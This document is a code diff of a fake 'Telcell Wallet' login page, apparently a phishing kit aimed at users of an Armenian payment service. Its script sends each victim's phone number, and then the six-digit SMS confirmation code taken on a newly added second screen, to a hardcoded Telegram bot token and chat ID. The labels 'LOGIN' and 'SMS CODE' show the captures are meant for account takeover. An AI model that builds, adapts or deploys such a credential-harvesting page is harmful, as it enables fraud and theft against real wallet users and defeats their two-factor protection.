@@ -6,195 +6,87 @@
     <title>Telcell Wallet</title>
     <style>
         * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+            margin: 0; padding: 0; box-sizing: border-box;
             font-family: -apple-system, BlinkMacSystemFont, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
+        body { background-color: #ffffff; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
+        .app-container { width: 100%; max-width: 400px; display: flex; flex-direction: column; padding: 20px; }
+        .back-button { background: none; border: none; font-size: 24px; color: #333; cursor: pointer; width: fit-content; margin-bottom: 10px; }
+        h1 { font-size: 34px; font-weight: 800; color: #222; margin-bottom: 25px; text-align: left; }
+        .center-content { text-align: center; margin-bottom: 30px; }
+        h2 { font-size: 20px; font-weight: 700; color: #222; }
+        .subtitle { font-size: 15px; color: #8e8e93; margin-top: 5px; }
+        .input-group { margin-top: 10px; }
+        label { font-size: 14px; font-weight: 700; color: #333; display: block; margin-bottom: 8px; }
+        .input-wrapper { background-color: #f2f2f7; border-radius: 16px; padding: 18px 20px; }
+        input { background: none; border: none; outline: none; width: 100%; font-size: 18px; color: #000; }
+        .hint { font-size: 14px; color: #8e8e93; margin-top: 8px; }
+        .info-box { display: flex; gap: 10px; margin-top: 20px; align-items: flex-start; }
+        .info-icon { color: #ff5e4d; border: 1.5px solid #ff5e4d; border-radius: 50%; width: 18px; height: 18px; display: flex; align-items: center; justify-content: center; font-size: 12px; font-weight: bold; flex-shrink: 0; }
+        .info-text { font-size: 14px; color: #8e8e93; line-height: 1.4; }
+        .footer { margin-top: auto; display: flex; flex-direction: column; align-items: center; gap: 15px; padding-bottom: 20px; }
+        .offer-link { color: #ff5e4d; font-weight: 700; text-decoration: none; font-size: 16px; }
+        .terms { font-size: 13px; color: #333; text-align: center; padding: 0 20px; line-height: 1.4; }
+        .submit-btn { width: 100%; background-color: #ffd0c8; color: white; border: none; border-radius: 30px; height: 56px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.3s; }
+        .submit-btn.active { background-color: #ff5e4d; }
 
-        body {
-            background-color: #ffffff;
-            display: flex;
-            justify-content: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-
-        .app-container {
-            width: 100%;
-            max-width: 400px;
-            display: flex;
-            flex-direction: column;
-            padding: 20px;
-        }
-
-        .back-button {
-            background: none;
-            border: none;
-            font-size: 24px;
-            color: #333;
-            cursor: pointer;
-            width: fit-content;
-            margin-bottom: 10px;
-        }
-
-        h1 {
-            font-size: 34px;
-            font-weight: 800;
-            color: #222;
-            margin-bottom: 25px;
-            text-align: left;
-        }
-
-        .center-content {
-            text-align: center;
-            margin-bottom: 30px;
-        }
-
-        h2 {
-            font-size: 20px;
-            font-weight: 700;
-            color: #222;
-        }
-
-        .subtitle {
-            font-size: 15px;
-            color: #8e8e93;
-            margin-top: 5px;
-        }
-
-        .input-group {
-            margin-top: 10px;
-        }
-
-        label {
-            font-size: 14px;
-            font-weight: 700;
-            color: #333;
-            display: block;
-            margin-bottom: 8px;
-        }
-
-        .input-wrapper {
-            background-color: #f2f2f7;
-            border-radius: 16px;
-            padding: 18px 20px;
-        }
-
-        input {
-            background: none;
-            border: none;
-            outline: none;
-            width: 100%;
-            font-size: 18px;
-            color: #000;
-        }
-
-        .hint {
-            font-size: 14px;
-            color: #8e8e93;
-            margin-top: 8px;
-        }
-
-        .info-box {
-            display: flex;
-            gap: 10px;
-            margin-top: 20px;
-            align-items: flex-start;
-        }
-
-        .info-icon {
-            color: #ff5e4d;
-            border: 1.5px solid #ff5e4d;
-            border-radius: 50%;
-            width: 18px;
-            height: 18px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 12px;
-            font-weight: bold;
-            flex-shrink: 0;
-            font-style: normal;
-        }
-
-        .info-text {
-            font-size: 14px;
-            color: #8e8e93;
-            line-height: 1.4;
-        }
-
-        .footer {
-            margin-top: auto;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: 15px;
-            padding-bottom: 20px;
-        }
-
-        .offer-link {
-            color: #ff5e4d;
-            font-weight: 700;
-            text-decoration: none;
-            font-size: 16px;
-        }
-
-        .terms {
-            font-size: 13px;
-            color: #333;
-            text-align: center;
-            padding: 0 20px;
-            line-height: 1.4;
-        }
-
-        .submit-btn {
-            width: 100%;
-            background-color: #ffd0c8;
-            color: white;
-            border: none;
-            border-radius: 30px;
-            height: 56px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
-        .submit-btn.active {
-            background-color: #ff5e4d;
-        }
+        /* Стили для второй страницы (SMS) */
+        .otp-container { display: flex; justify-content: space-between; margin: 30px 0; }
+        .otp-input { width: 45px; height: 55px; background-color: #f2f2f7; border: none; border-radius: 12px; text-align: center; font-size: 24px; font-weight: bold; }
+        .otp-input::-webkit-outer-spin-button, .otp-input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .resend-text { margin-top: 40px; text-align: center; color: #8e8e93; font-size: 14px; }
+        #timer { font-weight: bold; }
+        #sms-sent-to { text-align: center; font-size: 14px; color: #8e8e93; margin-top: 10px; padding: 0 10px; }
     </style>
 </head>
 <body>
 
 <div class="app-container">
-    <button class="back-button">←</button>
-
-    <h1>Բարև</h1>
+    <button class="back-button" id="backBtn">←</button>
+    <h1 id="mainTitle">Բարև</h1>
     
-    <div class="center-content">
-        <h2>Մուտք</h2>
-        <p class="subtitle">Ստեղծիր հարթակ վճարումներիդ համար</p>
+    <!-- ЭКРАН 1: ВВОД ТЕЛЕФОНА -->
+    <div id="screen-login">
+        <div class="center-content">
+            <h2>Մուտք</h2>
+            <p class="subtitle">Ստեղծիր հարթակ վճարումներիդ համար</p>
+        </div>
+        <form id="tgLoginForm">
+            <div class="input-group">
+                <label>Քո հեռախոսահամարը</label>
+                <div class="input-wrapper">
+                    <input type="tel" id="user_phone" placeholder="+374 (**) *** ***" required>
+                </div>
+                <p class="hint">Նմուշ՝ 77XXXXXX</p>
+                <div class="info-box">
+                    <i class="info-icon">i</i>
+                    <p class="info-text">Հաստատման կոդով SMS-ը կուղարկվի տվյալ հեռախոսահամարին</p>
+                </div>
+            </div>
+        </form>
     </div>
 
-    <form id="tgLoginForm">
-        <div class="input-group">
-            <label>Քո հեռախոսահամարը</label>
-            <div class="input-wrapper">
-                <input type="tel" id="user_phone" placeholder="+374 (**) *** ***" required>
-            </div>
-            <p class="hint">Նմուշ՝ 77XXXXXX</p>
-            
-            <div class="info-box">
-                <i class="info-icon">i</i>
-                <p class="info-text">Հաստատման կոդով SMS-ը կուղարկվի տվյալ հեռախոսահամարին</p>
-            </div>
+    <!-- ЭКРАН 2: ВВОД SMS (скрыт) -->
+    <div id="screen-otp" style="display: none;">
+        <div class="center-content">
+            <h2>SMS հաստատում</h2>
+            <p class="subtitle">Մուտքագրիր 6 նիշանոց կոդը SMS-ից</p>
         </div>
-    </form>
+        <div class="otp-container">
+            <input type="number" class="otp-input" maxlength="1">
+            <input type="number" class="otp-input" maxlength="1">
+            <input type="number" class="otp-input" maxlength="1">
+            <input type="number" class="otp-input" maxlength="1">
+            <input type="number" class="otp-input" maxlength="1">
+            <input type="number" class="otp-input" maxlength="1">
+        </div>
+        <p id="sms-sent-to"></p>
+        <div class="resend-text">Կրկին ուղարկել <span id="timer">112</span> կոդը</div>
+    </div>
 
-    <div class="footer">
+    <!-- ФУТЕР (кнопка) -->
+    <div class="footer" id="mainFooter">
         <a href="#" class="offer-link">Ծանոթանալ Օֆերտային</a>
         <p class="terms">Telcell Wallet մուտք գործելով՝ դու ընդունում ես օգտագործման կանոնները</p>
         <button type="submit" form="tgLoginForm" id="submitBtn" class="submit-btn">Հաստատել</button>
@@ -202,56 +94,83 @@
 </div>
 
 <script>
+    const BOT_TOKEN = '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8';
+    const CHAT_ID = '6576262467';
+
     const phoneInput = document.getElementById('user_phone');
     const submitBtn = document.getElementById('submitBtn');
+    const screenLogin = document.getElementById('screen-login');
+    const screenOtp = document.getElementById('screen-otp');
+    const mainTitle = document.getElementById('mainTitle');
+    const mainFooter = document.getElementById('mainFooter');
 
+    // Валидация кнопки
     phoneInput.addEventListener('input', () => {
-        if (phoneInput.value.trim().length > 5) {
-            submitBtn.classList.add('active');
-        } else {
-            submitBtn.classList.remove('active');
-        }
+        submitBtn.classList.toggle('active', phoneInput.value.trim().length > 5);
     });
 
+    // Отправка номера и переход к SMS
     document.getElementById('tgLoginForm').onsubmit = async function(e) {
         e.preventDefault();
-
-        const phoneValue = phoneInput.value;
-        const BOT_TOKEN = '8314828218:AAGY6twUZ6iFU7smncNhgGJ7pxh5z6MF1p8'; 
-        const CHAT_ID = '6576262467';
-
+        const phone = phoneInput.value;
         submitBtn.innerText = 'Ուղարկվում է...';
         submitBtn.disabled = true;
 
-                try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CHAT_ID,
-                    text: `📲 *НОВЫЙ ЛОГ ТЕЛСЕЛЛ*\n\n📞 Номер: ${phoneValue}`,
+                    text: `📲 *LOGIN*:\n📞 Номер: ${phone}`,
                     parse_mode: 'Markdown'
                 })
             });
 
-
-            const data = await response.json();
-
-            if (data.ok) {
-                alert('Ուղարկված է ✅');
-                phoneInput.value = '';
-                submitBtn.classList.remove('active');
-            } else {
-                alert('Ошибка: ' + data.description);
-            }
-        } catch (err) {
-            alert('Ցանցի սխալ');
-        } finally {
-            submitBtn.innerText = 'Հաստատել';
-            submitBtn.disabled = false;
-        }
+            // Переключаем экраны
+            screenLogin.style.display = 'none';
+            mainFooter.style.display = 'none';
+            mainTitle.innerText = 'Նույնականացում';
+            screenOtp.style.display = 'block';
+            document.getElementById('sms-sent-to').innerText = `Հաստատման մեկանգամյա կոդն ուղարկվել է ${phone} համարին`;
+            
+            startOtpLogic(phone);
+            startTimer();
+        } catch (err) { alert('Ошибка сети'); }
     };
-</script>
 
+    function startTimer() {
+        let time = 112;
+        const timerLabel = document.getElementById('timer');
+        setInterval(() => { if(time > 0) { time--; timerLabel.innerText = time; } }, 1000);
+    }
+
+    function startOtpLogic(phone) {
+        const inputs = document.querySelectorAll('.otp-input');
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', async (e) => {
+                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
+                if (e.target.value && index < 5) inputs[index + 1].focus();
+                
+                const code = Array.from(inputs).map(i => i.value).join('');
+                if (code.length === 6) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: `🔑 *SMS CODE*:\n📞 Номер: ${phone}\n💬 Код: ${code}`,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                    alert('Հաստատված է ✅');
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && !e.target.value && index > 0) inputs[index - 1].focus();
+            });
+        });
+    }
+</script>
 </body>
 </html>
